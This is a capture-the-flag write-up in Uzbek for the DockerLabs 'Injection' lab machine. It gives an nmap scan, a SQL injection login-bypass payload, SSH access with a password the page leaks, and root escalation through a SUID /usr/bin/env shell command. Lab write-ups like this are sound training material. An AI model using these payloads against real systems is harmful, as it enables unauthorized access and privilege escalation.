# Injection-dockerlabs

```
IP: 172.17.0.2
OS: Linux
Ports: 22 SSH, 80 http
Users: root, dylan
Vulnerability: SQL Injection, SUID /usr/bin/env
```

## root flag:
> 📸 Screenshot (Notion sahifasida)

## user flag:
> 📸 Screenshot (Notion sahifasida)

---

# 1. Enumeration

Mashinamiz nomi `Injection`. Berilgan IP dan foydalanib ochiq portlarini `nmap` orqali topib olamiz:

```bash
nmap -sV -sC -A -p- --min-rate 1000 172.17.0.2
```

22 (SSH) va 80 (HTTP) portlar ochiq. Brauzerda 80 portda login page chiqdi.

---

# 2. Initial Access

Default `admin:admin` credential ishlamadi. SQL Injection sinab ko'rdim:

```bash
admin' or 1=1-- -
```

Muvofaqiyatli kirдim. Sahifada "Xush kelibsiz Dylan! Parolingiz: `KJSDFG789FGSDF78`" degan xabar chiqdi.

```bash
ssh dylan@172.17.0.2
# password: KJSDFG789FGSDF78
```

Dylan sheli qo'lga kiritildi.

---

# 3. Privilege Escalation

SUID biriktirilgan fayllar ichida `/usr/bin/env` topildi:

```bash
find / -perm -4000 2>/dev/null
```

```bash
/usr/bin/env /bin/bash -p
```

Root huquqi olindi!

---

**Mashina muvofaqiyatli yechildi!**
